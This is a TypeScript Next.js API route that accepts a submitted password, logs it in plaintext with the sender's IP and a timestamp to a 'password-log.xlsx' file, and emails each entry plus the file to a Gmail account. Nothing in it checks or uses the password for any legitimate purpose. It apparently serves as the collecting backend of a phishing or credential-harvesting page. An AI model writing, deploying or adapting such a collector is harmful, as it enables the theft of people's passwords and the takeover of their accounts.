import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';
import os from 'os';
import ExcelJS from 'exceljs';

export async function POST(req: Request) {
  try {
    const { password } = await req.json();
    const ip = req.headers.get('x-forwarded-for') || 'unknown';

    const bypassToken = req.headers.get('x-vercel-protection-bypass');
    const expectedToken = process.env.VERCEL_AUTOMATION_BYPASS_SECRET;

    if (!bypassToken || bypassToken !== expectedToken) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    if (!password) {
      return NextResponse.json({ error: 'Password missing' }, { status: 400 });
    }

    const fileName = 'password-log.xlsx';
    const filePath = path.join(os.tmpdir(), fileName);

    const workbook = new ExcelJS.Workbook();
    let sheet;

    if (fs.existsSync(filePath)) {
      await workbook.xlsx.readFile(filePath);
      sheet = workbook.getWorksheet('Log') || workbook.addWorksheet('Log');
    } else {
      sheet = workbook.addWorksheet('Log');
      sheet.addRow(['Password', 'Timestamp', 'IP']);
    }

    sheet.addRow([password, new Date().toISOString(), ip]);
    await workbook.xlsx.writeFile(filePath);

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: 'New Password Entry',
      text: `Password: ${password}\nIP: ${ip}\nTime: ${new Date().toISOString()}`,
      attachments: [
        {
          filename: fileName,
          path: filePath,
        },
      ],
    };

    await transporter.sendMail(mailOptions);

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
